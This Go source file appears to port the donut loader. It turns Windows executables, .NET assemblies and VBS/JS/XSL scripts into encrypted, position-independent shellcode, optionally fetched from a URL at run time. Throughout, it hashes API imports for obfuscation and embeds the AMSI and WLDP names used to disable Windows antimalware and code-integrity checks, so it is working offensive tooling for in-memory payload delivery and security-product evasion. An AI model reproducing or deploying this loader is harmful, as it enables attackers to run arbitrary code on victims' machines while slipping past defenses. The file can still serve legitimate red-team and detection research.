package donut

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"io/ioutil"
	"log"
	"path/filepath"
	"strings"
	"unicode/utf16"
)

/*
	This code imports PE files and converts them to shellcode using the algorithm and stubs taken
	from the donut loader: https://github.com/TheWover/donut

	You can also use the native-code donut tools to do this conversion.

	This has the donut stubs hard-coded as arrays, so if something rots,
	try updating the stubs to latest donut first.
*/

// ShellcodeFromURL - Downloads a PE from URL, makes shellcode
func ShellcodeFromURL(fileURL string, config *DonutConfig) (*bytes.Buffer, error) {
	buf, err := DownloadFile(fileURL)
	if err != nil {
		return nil, err
	}
	// todo: set things up in config
	return ShellcodeFromBytes(buf, config)
}

// ShellcodeFromFile - Loads PE from file, makes shellcode
func ShellcodeFromFile(filename string, config *DonutConfig) (*bytes.Buffer, error) {

	b, err := ioutil.ReadFile(filename)
	if err != nil {
		return nil, err
	}
	switch strings.ToLower(filepath.Ext(filename)) {
	case ".exe":
		if config.DotNetMode {
			config.Type = DONUT_MODULE_NET_EXE
		} else {
			config.Type = DONUT_MODULE_EXE
		}
	case ".dll":
		if config.DotNetMode {
			config.Type = DONUT_MODULE_NET_DLL
		} else {
			config.Type = DONUT_MODULE_DLL
		}
	case ".xsl":
		config.Type = DONUT_MODULE_XSL
	case ".js":
		config.Type = DONUT_MODULE_JS
	case ".vbs":
		config.Type = DONUT_MODULE_VBS
	}
	return ShellcodeFromBytes(bytes.NewBuffer(b), config)
}

// ShellcodeFromBytes - Passed a PE as byte array, makes shellcode
func ShellcodeFromBytes(buf *bytes.Buffer, config *DonutConfig) (*bytes.Buffer, error) {

	if err := CreateModule(config, buf); err != nil {
		return nil, err
	}
	instance, err := CreateInstance(config)
	if err != nil {
		return nil, err
	}
	//ioutil.WriteFile("newinst.bin", instance.Bytes(), 0644)
	return Sandwich(config.Arch, instance)
}

// Sandwich - adds the donut prefix in the beginning (stomps DOS header), then payload, then donut stub at the end
func Sandwich(arch DonutArch, payload *bytes.Buffer) (*bytes.Buffer, error) {
	/*
			Disassembly:
					   0:  e8 					call $+
					   1:  xx xx xx xx			instance length
					   5:  [instance]
		 x=5+instanceLen:  0x59					pop ecx
		             x+1:  stub preamble + stub (either 32 or 64 bit or both)
	*/

	w := new(bytes.Buffer)
	instanceLen := uint32(payload.Len())
	w.WriteByte(0xE8)
	binary.Write(w, binary.LittleEndian, instanceLen)
	if _, err := payload.WriteTo(w); err != nil {
		return nil, err
	}
	w.WriteByte(0x59)

	picLen := int(instanceLen) + 32

	switch arch {
	case X32:
		w.WriteByte(0x5A) // preamble: pop edx, push ecx, push edx
		w.WriteByte(0x51)
		w.WriteByte(0x52)
		w.Write(PayloadEXEx32)
		picLen += len(PayloadEXEx32)
	case X64:
		w.Write(PayloadEXEx64)
		picLen += len(PayloadEXEx64)
	case X84:
		w.WriteByte(0x31) // preamble: xor eax,eax
		w.WriteByte(0xC0)
		w.WriteByte(0x48) // dec ecx
		w.WriteByte(0x0F) // js dword x86_code (skips length of x64 code)
		w.WriteByte(0x88)
		binary.Write(w, binary.LittleEndian, uint32(len(PayloadEXEx64)))
		w.Write(PayloadEXEx64)

		w.Write([]byte{0x5A, // in between 32/64 stubs: pop edx
			0x51,  // push ecx
			0x52}) // push edx
		w.Write(PayloadEXEx32)
		picLen += len(PayloadEXEx32)
		picLen += len(PayloadEXEx64)
	}

	// At the end, we pad with 0xCD "Clean Memory" bytes to mimic the behavior of the MSVC compiler used in donut.c
	lb := w.Len()
	for i := 0; i < picLen-lb; i++ {
		w.WriteByte(0xCD)
	}

	return w, nil
}

// CreateModule - Creates the Donut Module from Config
func CreateModule(config *DonutConfig, inputFile *bytes.Buffer) error {

	mod := new(DonutModule)

	if config.Type == DONUT_MODULE_NET_DLL ||
		config.Type == DONUT_MODULE_NET_EXE {
		if config.Domain == "" { // If no domain name specified, generate a random one
			d := RandomString(DONUT_DOMAIN_LEN)
			wstr := utf16.Encode([]rune(d))
			for i, r := range wstr {
				mod.Domain[i] = r
			}
			if config.Type == DONUT_MODULE_NET_DLL {
				log.Println("Class:", config.Class)
				wstr = utf16.Encode([]rune(config.Class))
				for i, r := range wstr {
					mod.Cls[i] = r
				}
				log.Println("Method:", config.Method)
				wstr = utf16.Encode([]rune(config.Method))
				b := bytes.NewBuffer([]byte{})
				for _, r := range wstr {
					binary.Write(b, binary.LittleEndian, r)
				}
				copy(mod.Method[:], b.Bytes())
			}
			// If no runtime specified in configuration, use default
			if config.Runtime == "" {
				config.Runtime = "v2.0.50727"
			}
			log.Println("Runtime:", config.Runtime)
			wstr = utf16.Encode([]rune(config.Runtime))
			for i, r := range wstr {
				mod.Runtime[i] = r
			}
		}
	} else if config.Type == DONUT_MODULE_DLL && config.Method == "" { // Unmanaged DLL? check for exported api
		log.Println("DLL function:", config.Method)
		copy(mod.Method[:], []byte(config.Method))
	}

	mod.ModType = uint32(config.Type)
	mod.Len = uint64(inputFile.Len())

	if config.Parameters != "" {
		params := strings.FieldsFunc(config.Parameters, func(r rune) bool { return r == ',' || r == ';' })
		for i, p := range params {
			if i >= DONUT_MAX_PARAM {
				return fmt.Errorf("Parameter Index(%v) exceeds DONUT_MAX_PARAM(%v)", i, DONUT_MAX_PARAM)
			} else if len(p) >= DONUT_MAX_NAME {
				return fmt.Errorf("Parameter: %s exceeds DONUT_MAX_NAME(%v)", p, DONUT_MAX_PARAM)
			}
			log.Println("Adding parameter:", p)
			wstr := utf16.Encode([]rune(p))
			for j, r := range wstr {
				mod.Param[i][j] = r
			}
			mod.ParamCount = uint32(i) + 1
		}
	}

	// read module into memory
	b := new(bytes.Buffer)
	mod.WriteTo(b)
	inputFile.WriteTo(b)
	config.ModuleData = b

	// update configuration with pointer to module
	config.Module = mod
	return nil
}

// CreateInstance - Creates the Donut Instance from Config
func CreateInstance(config *DonutConfig) (*bytes.Buffer, error) {

	inst := new(DonutInstance)

	//inst.Mod = *config.Module

	log.Println("Entering")

	ib := new(bytes.Buffer)
	inst.WriteTo(ib)

	//instLen := uint32(binary.Size(*inst))
	//instLen = uint32(ib.Len())

	modLen := uint32(config.ModuleData.Len()) // ModuleData is mod struct + input file
	instLen := uint32(8312 + 8)               //todo: that's how big it is in the C version...

	// if this is a PIC instance, add the size of module
	// that will be appended to the end of structure
	if config.InstType == DONUT_INSTANCE_PIC {
		log.Printf("The size of module is %v bytes. Adding to size of instance.\n", modLen)
		instLen += modLen
	}

	if !config.NoCrypto {
		log.Println("Generating random key for instance")
		tk, err := GenerateRandomBytes(16)
		if err != nil {
			return nil, err
		}
		copy(inst.KeyMk[:], tk)
		tk, err = GenerateRandomBytes(16)
		if err != nil {
			return nil, err
		}
		copy(inst.KeyCtr[:], tk)
		log.Println("Generating random key for module")
		tk, err = GenerateRandomBytes(16)
		if err != nil {
			return nil, err
		}
		copy(inst.ModKeyMk[:], tk)
		tk, err = GenerateRandomBytes(16)
		if err != nil {
			return nil, err
		}
		copy(inst.ModKeyCtr[:], tk)
		log.Println("Generating random string to verify decryption")
		sbsig := RandomString(DONUT_SIG_LEN)
		copy(inst.Sig[:], []byte(sbsig))
		log.Println("Generating random IV for Maru hash")
		iv, err := GenerateRandomBytes(MARU_IV_LEN)
		if err != nil {
			return nil, err
		}
		copy(inst.Iv[:], []byte(iv))
	}
	log.Println("Generating hashes for API using IV:", inst.Iv)

	for cnt, c := range api_imports {
		// calculate hash for DLL string
		dllHash := Maru([]byte(c.Module), inst.Iv[:])

		// calculate hash for API string.
		// xor with DLL hash and store in instance
		inst.Hash[cnt] = Maru([]byte(c.Name), inst.Iv[:]) ^ dllHash

		log.Printf("Hash for %s : %s = %x\n",
			c.Module,
			c.Name,
			inst.Hash[cnt])
	}
	// save how many API to resolve
	inst.ApiCount = uint32(len(api_imports))
	inst.DllCount = 0
	copy(inst.DllName[inst.DllCount][:], []byte("ole32.dll"))
	inst.DllCount++
	copy(inst.DllName[inst.DllCount][:], []byte("oleaut32.dll"))
	inst.DllCount++
	copy(inst.DllName[inst.DllCount][:], []byte("wininet.dll"))
	inst.DllCount++
	copy(inst.DllName[inst.DllCount][:], []byte("mscoree.dll"))
	inst.DllCount++

	// if module is .NET assembly
	if config.Type == DONUT_MODULE_NET_DLL ||
		config.Type == DONUT_MODULE_NET_EXE {
		log.Println("Copying GUID structures and DLL strings for loading .NET assemblies")
		copy(inst.XIID_AppDomain[:], xIID_AppDomain[:])
		copy(inst.XIID_ICLRMetaHost[:], xIID_ICLRMetaHost[:])
		copy(inst.XCLSID_CLRMetaHost[:], xCLSID_CLRMetaHost[:])
		copy(inst.XIID_ICLRRuntimeInfo[:], xIID_ICLRRuntimeInfo[:])
		copy(inst.XIID_ICorRuntimeHost[:], xIID_ICorRuntimeHost[:])
		copy(inst.XCLSID_CorRuntimeHost[:], xCLSID_CorRuntimeHost[:])
	} else if config.Type == DONUT_MODULE_VBS ||
		config.Type == DONUT_MODULE_JS {
		log.Println("Copying GUID structures and DLL strings for loading VBS/JS")

		copy(inst.XIID_IUnknown[:], xIID_IUnknown[:])
		copy(inst.XIID_IDispatch[:], xIID_IDispatch[:])
		copy(inst.XIID_IHost[:], xIID_IHost[:])
		copy(inst.XIID_IActiveScript[:], xIID_IActiveScript[:])
		copy(inst.XIID_IActiveScriptSite[:], xIID_IActiveScriptSite[:])
		copy(inst.XIID_IActiveScriptSiteWindow[:], xIID_IActiveScriptSiteWindow[:])
		copy(inst.XIID_IActiveScriptParse32[:], xIID_IActiveScriptParse32[:])
		copy(inst.XIID_IActiveScriptParse64[:], xIID_IActiveScriptParse64[:])

		wstr := utf16.Encode([]rune("WScript"))
		for j, r := range wstr {
			inst.Wscript[j] = r
		}
		wstr = utf16.Encode([]rune("wscript.exe"))
		for j, r := range wstr {
			inst.Wscript_exe[j] = r
		}

		if config.Type == DONUT_MODULE_VBS {
			copy(inst.XCLSID_ScriptLanguage[:], xCLSID_VBScript[:])
		} else {
			copy(inst.XCLSID_ScriptLanguage[:], xCLSID_JScript[:])
		}
	} else if config.Type == DONUT_MODULE_XSL {
		log.Println("Copying GUID structures for loading XSL to instance")
		copy(inst.XCLSID_DOMDocument30[:], xCLSID_DOMDocument30[:])
		copy(inst.XIID_IXMLDOMDocument[:], xIID_IXMLDOMDocument[:])
		copy(inst.XIID_IXMLDOMNode[:], xIID_IXMLDOMNode[:])
	}
	// required to disable AMSI
	copy(inst.S[:], "AMSI")
	copy(inst.AmsiInit[:], "AmsiInitialize")
	copy(inst.AmsiScanBuf[:], "AmsiScanBuffer")
	copy(inst.AmsiScanStr[:], "AmsiScanString")

	copy(inst.Clr[:], "CLR")

	// required to disable WLDP
	copy(inst.Wldp[:], "WLDP")
	copy(inst.WldpQuery[:], "WldpQueryDynamicCodeTrust")
	copy(inst.WldpIsApproved[:], "WldpIsClassInApprovedList")

	// set the type of instance we're creating
	inst.Type = uint32(int(config.InstType))

	// if the module will be downloaded
	// set the URL parameter and request verb
	if inst.Type == DONUT_INSTANCE_URL {
		// generate a random name for module
		// that will be saved to disk
		config.ModuleName = RandomString(DONUT_MAX_MODNAME)
		log.Println("Generated random name for module :", config.ModuleName)
		log.Println("Setting URL parameters")
		// append module name
		copy(inst.Url[:], config.URL+config.ModuleName)

		// set the request verb
		copy(inst.Req[:], "GET")
		log.Println("Payload will attempt download from:", inst.Url)
	}

	inst.Mod_len = uint64(modLen) + 8 //todo: this 8 is from alignment I think?
	inst.Len = instLen
	config.inst = inst
	config.instLen = instLen

	if config.InstType == DONUT_INSTANCE_URL {
		log.Println("encrypting module for download")
		config.ModuleMac = Maru(inst.Sig[:], inst.Iv[:])
		if config.NoCrypto {
			return config.ModuleData, nil
		}
		config.ModuleData = Encrypt( //todo: make encrypt work on buffers?
			inst.ModKeyMk[:],
			inst.ModKeyCtr[:],
			config.ModuleData.Bytes(),
			uint32(config.ModuleData.Len()))
	} else { //if config.InstType == DONUT_INSTANCE_PIC
		if !config.NoCrypto {
			inst.Mac = Maru(inst.Sig[:], inst.Iv[:])
		}
		b := new(bytes.Buffer)
		inst.WriteTo(b)
		if _, err := config.ModuleData.WriteTo(b); err != nil {
			log.Fatal(err)
		}
		for uint32(b.Len()) < config.instLen {
			b.WriteByte(0)
		}
		if config.NoCrypto {
			return b, nil
		}
		log.Println("encrypting instance")
		instData := b.Bytes()
		offset := 4 + // Len uint32
			CipherKeyLen + CipherBlockLen + // Instance Crypt
			8 + // IV
			64 // Hash

		encInstData := Encrypt(
			inst.KeyMk[:],
			inst.KeyCtr[:],
			instData[offset:],
			uint32(len(instData))-offset)
		bc := new(bytes.Buffer)
		binary.Write(bc, binary.LittleEndian, instData[:offset])
		if _, err := encInstData.WriteTo(bc); err != nil {
			log.Fatal(err)
		}
		log.Println("Leaving.")
		return bc, nil
	}

	return nil, nil
}
